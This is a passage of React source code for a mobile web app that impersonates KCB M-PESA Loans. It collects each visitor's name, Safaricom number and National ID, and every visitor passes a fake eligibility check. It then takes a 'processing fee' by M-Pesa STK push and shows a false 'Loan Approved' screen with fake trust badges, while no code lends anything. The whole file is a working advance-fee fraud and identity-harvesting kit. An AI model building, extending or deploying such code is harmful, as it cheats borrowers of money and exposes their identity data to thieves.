        }

        @media (max-width: 600px) {

          .kcb-header {
            height: 70px;
            padding: 0 18px;
          }

          .kcb-header-logo {
            width: 42px;
            height: 42px;
          }

          .kcb-header-title {
            font-size: 15px;
          }

          .kcb-hero-inner {
            padding:
              45px
              20px
              70px;
          }

          .kcb-heading {
            font-size: 39px;
            letter-spacing: -1px;
          }

          .kcb-subheading {
            font-size: 16px;
          }

          .kcb-steps {
            gap: 14px;
            flex-wrap: wrap;
          }

          .kcb-step {
            font-size: 14px;
          }

          .kcb-step-number {
            width: 30px;
            height: 30px;
          }

          .kcb-floating-card {
            left: 8px;
            right: 8px;
            padding: 10px 8px;
          }

          .kcb-floating-item strong {
            font-size: 17px;
          }

          .kcb-floating-item span {
            font-size: 10px;
          }

          .kcb-features-section {
            padding:
              45px
              20px;
          }

          .kcb-feature-card {
            min-height: 220px;
          }

          .kcb-security-section {
            min-height: auto;
            padding: 35px 20px;

            flex-direction: column;
            gap: 22px;
          }

          .kcb-footer-inner {
            padding-left: 20px;
            padding-right: 20px;
          }

          .kcb-footer-links {
            gap: 20px;
          }

          .kcb-footer-copy {
            font-size: 11px;
            white-space: normal;
            text-align: center;
          }
        }

      `}</style>
    </div>
  );
}





function LoadingScreen() {
  return (
    <div style={{
      position: "fixed",
      inset: 0,
      background: "#0f172a",
      color: "#fff",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      zIndex: 999
    }}>
      <div className="loader-circle" />

      <p style={{ marginTop: 20, fontSize: 14 }}>
        Checking eligibility...
      </p>
    </div>
  );
}







/* ── SCREEN 2: ELIGIBILITY FORM ── */
function EligibilityScreen({ onNext }) {
  const [form, setForm] = useState({
    name: "",
    phone: "",
    id: "",
    loanType: ""
  });
const [errs, setErrs] = useState({
  name: "",
  phone: "",
  id: "",
  loanType: ""
});
  const [loading, setLoading] = useState(false);
const [loadingScreen, setLoadingScreen] = useState(false);

const submit = async () => {
  const e = validate();

  if (Object.values(e).some(v => v)) {
    setErrs(e);
    return;
  }

  setLoadingScreen(true);

  setTimeout(() => {
    setLoadingScreen(false);
    onNext({
      ...form,
      phone: normalisePhone(form.phone)
    });
  }, 2500);
};




  const update = (key, value) => {
    setForm(prev => ({ ...prev, [key]: value }));

    // clear error instantly when user edits
    setErrs(prev => ({ ...prev, [key]: "" }));
  };

  const validate = () => {
    const e = {
  name: "",
  phone: "",
  id: "",
  loanType: ""
};
    if (!form.name.trim()) {
      e.name = "Enter your full name";
    }

    if (!isValidPhone(form.phone)) {
      e.phone = "Enter valid Safaricom number (07, 01, or 254...)";
    }

    if (!/^\d{7,9}$/.test(form.id)) {
      e.id = "Enter valid ID (7–9 digits)";
    }

    if (!form.loanType) {
      e.loanType = "Select loan type";
    }

    return e;
  };


  return (
    <>
      {/* TOP BAR */}
      {loadingScreen && <LoadingScreen />}
      <div style={topBar}>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          ←
          <strong>KCB M-PESA Loans</strong>
        </div>
        <span style={{ fontSize: 12 }}>Help</span>
      </div>

      {/* FORM */}
      <div style={container}>
        <div style={card}>

          <h2 style={title}>M-PESA INFORMATION</h2>
          <p style={subtitle}>Fill in your details to check eligibility</p>

          {/* NAME */}
          <label style={label}>Full Name</label>
          <input
            type="text"
            placeholder="Enter your full name"
            value={form.name}
            onChange={e => update("name", e.target.value)}
            style={inputStyle(errs.name)}
          />
          {errs.name && <small style={errStyle}>{errs.name}</small>}

          {/* PHONE */}
          <label style={label}>Phone Number</label>
          <input
            type="tel"
            placeholder="0712345678"
            value={form.phone}
            onChange={e =>
              update("phone", e.target.value.replace(/\D/g, ""))
            }
            style={inputStyle(errs.phone)}
          />
          <small style={hint}>Safaricom line required</small>
          {errs.phone && <small style={errStyle}>{errs.phone}</small>}

          {/* ID */}
          <label style={label}>National ID</label>
          <input
            type="text"
            placeholder="7 to 9 digits"
            value={form.id}
            onChange={e =>
              update("id", e.target.value.replace(/\D/g, ""))
            }
            style={inputStyle(errs.id)}
          />
          {errs.id && <small style={errStyle}>{errs.id}</small>}

          {/* SELECT */}
          <label style={label}>Loan Type</label>
          <select
            value={form.loanType}
            onChange={e => update("loanType", e.target.value)}
            style={inputStyle(errs.loanType)}
          >
            <option value="">Select loan type</option>
            {LOAN_TYPES.map(l => (
              <option key={l}>{l}</option>
            ))}
          </select>
          {errs.loanType && <small style={errStyle}>{errs.loanType}</small>}

          {/* BUTTON */}
          <button
            onClick={submit}
            disabled={loading}
            style={btn}
          >
            {loading ? "Checking..." : "Check Eligibility"}
          </button>

        </div>
      </div>

      {/* FOOTER */}
      <div style={footer}>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Contact</span>
      </div>
    </>
  );
}


/* ── STYLES ── */
const topBar = {
  display: "flex",
  justifyContent: "space-between",
  padding: "14px 16px",
  background: "#fff",
  borderBottom: "1px solid #eee"
};

const container = {
  display: "flex",
  justifyContent: "center",
  padding: "30px 16px"
};

const card = {
  width: "100%",
  maxWidth: 520,
  background: "#fff",
  borderRadius: 16,
  padding: "28px 22px",
  boxShadow: "0 10px 30px rgba(0,0,0,0.08)"
};

const title = {
  textAlign: "center" as const,
  fontWeight: 800,
  color: "#1f3b73",
  marginBottom: 6
};
const subtitle = {
  textAlign: "center" as const,
  fontSize: 13,
  color: "#6b7280",
  marginBottom: 20
};

const label = {
  fontSize: 13,
  fontWeight: 600
};

const hint = {
  fontSize: 11,
  color: "#9ca3af"
};

const btn = {
  width: "100%",
  background: "#dc2626",
  color: "#fff",
  padding: "14px",
  border: "none",
  borderRadius: 10,
  fontWeight: 700,
  cursor: "pointer"
};

const inputStyle = (err) => ({
  width: "100%",
  padding: "12px",
  marginTop: 6,
  marginBottom: 12,
  borderRadius: 8,
  border: err ? "1.5px solid red" : "1.5px solid #e5e7eb",
  outline: "none",
  fontSize: 14
});

const errStyle = {
  color: "red",
  fontSize: 11,
  marginTop: -8,
  display: "block",
  marginBottom: 8
};
const footer = {
  background: "#1f3b73",
  color: "#fff",
  padding: "14px",
  fontSize: 12,
  display: "flex",
  justifyContent: "space-between"
};




function LoanGridScreen({ userData, onSelect }) {
  return (
    <>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB M-PESA Loans</span>
        </div>
      </div>


      <div style={{ padding: "24px 16px 10px" }}>
  <div style={{ textAlign: "center", marginBottom: 10 }}>
    <div style={{
      width: 60,
      height: 60,
      borderRadius: "50%",
      background: "#e6f4ea",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      margin: "0 auto 10px",
      fontSize: 26
    }}>
      ✅
    </div>

    <h2 style={{
      fontSize: 22,
      fontWeight: 700,
      color: "#1f3b73",
      marginBottom: 4
    }}>
      You're approved!
    </h2>

    <p style={{
      fontSize: 14,
      color: "#6b7280"
    }}>
      Great news, <b>{userData.name}</b>! Pick the loan amount that works best for you.
    </p>

    <p style={{
      fontSize: 12,
      color: "#9ca3af",
      marginTop: 6
    }}>
      5 loan types available
    </p>
  </div>
</div>





      

      {LOAN_GROUPS.map((group, idx) => (
        <div key={idx} style={{ padding: "10px 16px" }}>

<div style={{
  display: "flex",
  alignItems: "center",
  gap: 6,
  marginBottom: 10
}}>
  <div style={{
    width: 3,
    height: 16,
    background: "#1f3b73",
    borderRadius: 2
  }} />

  <h4 style={{
    fontSize: 16,
    fontWeight: 600,
    color: "#1f3b73"
  }}>
    {group.title}
  </h4>

  <span style={{
    fontSize: 12,
    color: "#9ca3af"
  }}>
    {group.title.includes("Personal") && "Flexible loans for personal needs"}
    {group.title.includes("Business") && "Grow your business"}
    {group.title.includes("Education") && "Invest in your future"}
    {group.title.includes("Emergency") && "Quick emergency funds"}
    {group.title.includes("Home") && "Upgrade your home"}
  </span>
</div>



         
          <div style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: 10
          }}>
            {group.items.map((loan) => (
              <div
  key={loan.amount}
  style={{
    background: "#fff",
    padding: 16,
    borderRadius: 14,
    border: "1px solid #e5e7eb",
    boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
    textAlign: "center"
  }}
>
  <div style={{
    fontWeight: 700,
    fontSize: 16,
    color: "#1f3b73"
  }}>
    KSh {fmt(loan.amount)}
  </div>

  <div style={{
    fontSize: 12,
    color: "#6b7280",
    marginTop: 4
  }}>
    Repay over 6 months
  </div>

  <div style={{
    fontSize: 12,
    color: "#f97316",
    marginTop: 4,
    fontWeight: 500
  }}>
    Fee: KSh {fmt(loan.fee)}
  </div>

  <button
    onClick={() => onSelect(loan)}
    style={{
      marginTop: 12,
      width: "100%",
      padding: "10px 0",
      borderRadius: 10,
      border: "none",
      background: "#f3f4f6",
      fontWeight: 700,
      fontSize: 13,
      color: "#374151",
      cursor: "pointer"
    }}
  >
    SELECT
  </button>
</div>
            ))}
          </div>
        </div>
      ))}
    </>
  );
}




/* ── MODAL: CONFIRM LOAN APPLICATION ── */
function ConfirmScreen({ loan, userData, onApply, onBack }) {
  const interest = Math.round(loan.amount * 0.088);
  const total = loan.amount + loan.fee + interest;

  const normPhone = normalisePhone(userData.phone) || userData.phone;

  return (
    <div style={{ padding: 16 }}>
      
      <div style={{ marginBottom: 10, cursor: "pointer" }} onClick={onBack}>
        ← Back to offers
      </div>

      <div style={{
        background: "#1f3b73",
        color: "#fff",
        padding: 16,
        borderRadius: 12,
        marginBottom: 16,
        fontWeight: 700,
        fontSize: 18
      }}>
        Confirm Your Loan
      </div>

      <div style={{
        background: "#fff",
        padding: 16,
        borderRadius: 12
      }}>
        <p>Hi {userData.name}, please review the details below before applying.</p>

        <div style={{
          background: "#e2e8f0",
          padding: 16,
          borderRadius: 10,
          margin: "12px 0",
          display: "flex",
          justifyContent: "space-between"
        }}>
          <div>
            <div style={{ fontSize: 12 }}>LOAN AMOUNT</div>
            <div style={{ fontWeight: 800, fontSize: 20 }}>
              KSh {fmt(loan.amount)}
            </div>
          </div>

          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 12 }}>Repayment Period</div>
            <div style={{ fontWeight: 700 }}>6 months</div>
          </div>
        </div>

        <div style={{ marginTop: 10, marginBottom: 10, fontWeight: 700 }}>
          FEE BREAKDOWN
        </div>

        <div style={{ display: "flex", justifyContent: "space-between" }}>
          <div>
            <div>Processing Fee to Confirm Phone Number</div>
            <div style={{ fontSize: 12, color: "#666" }}>One-time</div>
          </div>
          <div>KSh {fmt(loan.fee)}</div>
        </div>

        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
          <div>
            <div>Interest</div>
            <div style={{ fontSize: 12, color: "#666" }}>8.8%</div>
          </div>
          <div>KSh {fmt(interest)}</div>
        </div>

        <div style={{ display: "flex", justifyContent: "space-between", marginTop: 8 }}>
          <span>Repayment period</span>
          <span>6 months</span>
        </div>

        <hr style={{ margin: "14px 0" }} />

        <div style={{
          display: "flex",
          justifyContent: "space-between",
          fontWeight: 800,
          color: "red"
        }}>
          <span>Total repayment</span>
          <span>KSh {fmt(total)}</span>
        </div>

        <div style={{
          marginTop: 14,
          background: "#f1f5f9",
          padding: 12,
          borderRadius: 10,
          textAlign: "center"
        }}>
          Funds will be sent to <b>+{normPhone}</b>
        </div>

        <button
          onClick={onApply}
          style={{
            marginTop: 20,
            width: "100%",
            padding: 16,
            background: "#e11d48",
            color: "#fff",
            border: "none",
            borderRadius: 10,
            fontWeight: 700
          }}
        >
          APPLY NOW
        </button>
      </div>
    </div>
  );
}

/* ── MODAL: STK PUSH SENT ── */
/* ── MODAL: STK PUSH SENT ── */
function STKModal({ loan, userData, onSuccess, onCancel }) {
  const [dotsCount, setDotsCount] = useState(1);
  const [statusText, setStatusText] = useState(
    "Waiting for M-Pesa confirmation..."
  );

  const pollRef = useRef(null);
  const dotsRef = useRef(null);
  const hasRunRef = useRef(false);
  const startTimeRef = useRef(Date.now());
  const successTriggeredRef = useRef(false);

  const normPhone = normalisePhone(userData.phone) || userData.phone;

  useEffect(() => {
    if (hasRunRef.current) return;
    hasRunRef.current = true;

    startTimeRef.current = Date.now();

    // dots animation
    dotsRef.current = setInterval(() => {
      setDotsCount((d) => (d >= 3 ? 1 : d + 1));
    }, 600);


    const finishSuccess = () => {
      if (successTriggeredRef.current) return;

      successTriggeredRef.current = true;

      clearInterval(pollRef.current);

      setStatusText("Payment confirmed successfully...");

      setTimeout(() => {
        onSuccess();
      }, 1200);
    };


    const initPay = async () => {
      try {

        setStatusText("Sending STK request...");

        const res = await fetch(`${MPESA_BASE}/api/runPrompt`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone: normPhone,
            amount: loan.fee,
            local_id: `KCB-${Date.now()}`,
            transaction_desc: `Subscr fee Ksh ${loan.fee}`,
          }),
        });


        const data = await res.json().catch(() => ({}));


        if (!res.ok || data.status === false) {
          console.log("STK failed to send:", data);
          setStatusText("Waiting for M-Pesa prompt...");
          return;
        }


        const cid =
          data.checkout_request_id ||
          data.checkoutRequestId ||
          null;


        if (!cid) {
          console.log("Missing checkout request ID");
          return;
        }


        setStatusText(
          "STK prompt sent. Enter your M-Pesa PIN..."
        );


        pollRef.current = setInterval(async () => {

          try {

            const r = await fetch(
              `${MPESA_BASE}/api/status/${cid}`
            );


            if (!r.ok) return;


            const d = await r.json();


            const completed =
              d?.success === true ||
              d?.status === "completed" ||
              d?.ResultCode === 0;


            if (completed) {


              const elapsed =
                Date.now() - startTimeRef.current;


              /*
                Force STK screen to remain visible
                for at least 20 seconds.
                Prevents instant success screen.
              */
              const minimumWait = 30000;


              if (elapsed < minimumWait) {

                const waitMore =
                  minimumWait - elapsed;


                setStatusText(
                  "Payment received. Finalizing..."
                );


                setTimeout(() => {
                  finishSuccess();
                }, waitMore);


              } else {

                finishSuccess();

              }

            } else {

              setStatusText(
                "Waiting for M-Pesa confirmation..."
              );

            }


          } catch (err) {

            // silently ignore polling errors

          }


        }, 6000);


      } catch (err) {

        console.log(
          "STK network error",
          err
        );

      }
    };


    initPay();


    return () => {

      clearInterval(
        pollRef.current
      );

      clearInterval(
        dotsRef.current
      );

    };


  }, []);



  return (
    <div className="modal-bg">

      <div
        className="modal-box"
        style={{
          textAlign: "center"
        }}
      >

        <div className="modal-icon phone">
          📱
        </div>


        <div className="stk-title">
          STK Push Sent
        </div>


        <div className="stk-phone-box">
          {statusText}
        </div>


        <div className="stk-bar-wrap">
          <div className="stk-bar-fill" />
        </div>


        <div className="stk-verifying">

          Processing
          <span>
            {".".repeat(dotsCount)}
          </span>

        </div>


        <button
          className="stk-manual"
          onClick={onCancel}
        >
          Cancel
        </button>


      </div>

    </div>
  );
}
/* ── SUCCESS SCREEN ── */
function SuccessScreen({ loan, userData, onDone }) {
  const now = new Date();
  const repayDate = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
  const repayStr = repayDate.toLocaleDateString("en-KE", { day: "numeric", month: "short", year: "numeric" });

  return (
    <div style={{ padding: "0 0 30px" }}>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
        </div>
      </div>
      <div className="success-wrap">
        <div className="success-icon">🎉</div>
        <div className="success-title">Loan Approved!</div>
        <div className="success-sub">
          Congratulations <strong>{userData.name}</strong>! Your loan has been approved and will be disbursed to <strong>{userData.phone}</strong> within minutes.
        </div>
        <div className="success-amount-box">
          <div className="success-amount">Ksh {fmt(loan.amount)}</div>
          <div className="success-amount-sub">Disbursing to M-Pesa shortly ⚡</div>
        </div>
        <div className="success-details">
          {[
            ["Loan Amount", `Ksh ${fmt(loan.amount)}`],
            ["Processing Fee", `Ksh ${fmt(loan.fee)}`],
            ["Total Repayment", `Ksh ${fmt(loan.repayment)}`],
            ["Repayment Date", repayStr],
            ["M-Pesa Number", userData.phone],
            ["Status", "✅ Approved"],
          ].map(([k, v]) => (
            <div key={k} className="srow">
              <span className="srow-k">{k}</span>
              <span className="srow-v">{v}</span>
            </div>
          ))}
        </div>
        <button
          className="btn-primary"
          style={{ width: "100%", margin: "20px 0 0", display: "flex" }}
          onClick={onDone}
        >
          Apply for Another Loan →
        </button>
        <div className="security-strip" style={{ paddingTop: 16 }}>
          {[["🔒","SSL Secured"],["🛡️","Data Protected"],["⭐","Licensed Program"],["👥","Trusted by Thousands"]].map(([ic,lb])=>(
            <div key={lb} className="sec-pill"><span>{ic}</span>{lb}</div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════════════
   ROOT APP
══════════════════════════════════════════════════════════════ */
export default function KCBLoans() {
  const [screen, setScreen] = useState("hero"); // hero | form | grid | success
  const [userData, setUserData] = useState(null);
  const [selectedLoan, setSelectedLoan] = useState(null);
  const [showConfirm, setShowConfirm] = useState(false);
  const [showSTK, setShowSTK] = useState(false);

  const handleFormNext = (data) => {
    setUserData(data);
    setScreen("grid");
  };

 const handleLoanSelect = (loan) => {
  setSelectedLoan(loan);
  setScreen("confirm");
};

  const handleProceed = () => {
    setShowConfirm(false);
    setShowSTK(true);
  };

  const handleSuccess = () => {
    setShowSTK(false);
    setScreen("success");
  };

  const handleReset = () => {
    setScreen("hero");
    setUserData(null);
    setSelectedLoan(null);
    setShowConfirm(false);
    setShowSTK(false);
  };

  return (
    <>
      <style>{CSS}</style>
      <div className="app">

       {screen === "hero" && <HeroScreen onStart={() => setScreen("form")} />}

{screen === "form" && <EligibilityScreen onNext={handleFormNext} />}

{screen === "grid" && (
  <LoanGridScreen userData={userData} onSelect={handleLoanSelect} />
)}

{screen === "confirm" && selectedLoan && (
  <ConfirmScreen
    loan={selectedLoan}
    userData={userData}
    onApply={() => setShowSTK(true)}
    onBack={() => setScreen("grid")}
  />
)}

{screen === "success" && (
  <SuccessScreen
    loan={selectedLoan}
    userData={userData}
    onDone={handleReset}
  />
)}



{showSTK && (
  <STKModal
    loan={selectedLoan}
    userData={userData}
    onSuccess={handleSuccess}
    onCancel={() => setShowSTK(false)}
  />
)}

     

      </div>
    </>
  );
}
